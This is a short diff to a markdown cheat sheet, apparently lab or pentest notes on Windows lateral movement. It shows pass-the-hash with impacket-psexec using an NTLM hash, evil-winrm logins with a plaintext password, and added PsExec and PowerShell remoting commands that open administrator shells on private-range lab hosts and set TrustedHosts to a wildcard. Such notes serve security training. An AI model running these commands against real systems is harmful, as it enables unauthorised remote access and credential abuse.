@@ -44,6 +44,9 @@ Password:
 
 #using local account hash.
 impacket-psexec administrator@192.168.154.131 -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
+
+#using PsExec.exe password
+.\PsExec.exe \\192.168.154.134 -i -u Administrator cmd.exe
 ```
 
 Pth using  wmiexec.py & smbexec.py to get the shell
@@ -187,6 +190,13 @@ evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -l
 #using docker.
 docker run --rm -ti --name evil-winrm  oscarakaelvis/evil-winrm -i 192.168.1.105 -u Administrator -p 'Ignite@987'
 
+
+#using powershell to connect to target 
+Enable-PSRemoting -force
+Test-NetConnection 192.168.154.134 -CommonTCPPort WINRM
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value * -Force
+Enter-PSSession 192.168.154.134 -Credential MARVEL.local\Administrator
+ 
 ```
 
 
